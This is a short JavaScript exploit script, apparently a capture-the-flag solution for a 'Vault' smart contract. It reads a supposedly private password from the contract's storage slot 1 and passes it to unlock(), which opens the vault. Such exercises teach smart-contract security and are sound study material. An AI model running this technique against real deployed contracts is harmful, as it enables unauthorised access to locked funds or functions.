import { ethers } from "ethers";

export default async function (providerUrl, contractAddress) {

  const provider = new ethers.JsonRpcProvider(providerUrl);
  const signer = await provider.getSigner(1);

  // ABI fragment
  const abi = [
    "function unlock(bytes32 _password) public",
    "function locked() public view returns (bool)"
  ];

  const vault = new ethers.Contract(contractAddress, abi, signer);

  console.log("Vault locked initially:", await vault.locked());

  // Read private variable from storage slot 1
  const password = await provider.getStorageAt(contractAddress, 1);
  console.log("Extracted password from storage slot 1:", password);

  // Unlock the vault
  const tx = await vault.unlock(password);
  await tx.wait();

  console.log("Vault locked after exploit:", await vault.locked());
  console.log("Exploit complete!");
}

